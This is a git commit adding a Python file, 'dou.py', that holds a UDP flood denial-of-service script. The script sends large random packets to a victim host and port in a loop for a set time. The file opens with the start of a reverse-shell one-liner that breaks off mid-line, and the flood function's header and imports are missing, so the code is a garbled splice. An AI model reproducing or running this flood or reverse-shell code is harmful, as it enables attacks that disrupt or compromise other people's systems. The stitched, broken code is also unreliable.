5dc924325360355ece9d4368a26dd334b8fe78ef
vilesis <48322198+vilesis@users.noreply.github.com>
2019-06-15 17:20:57 -0300

    Create dou.py

---
+++ dou.py
@@ -0,0 +1,24 @@
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(
+    # 1024 representes one byte to the server
+    bytes = random._urandom(1000000)
+    timeout =  time.time() + duration
+    sent = 0
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
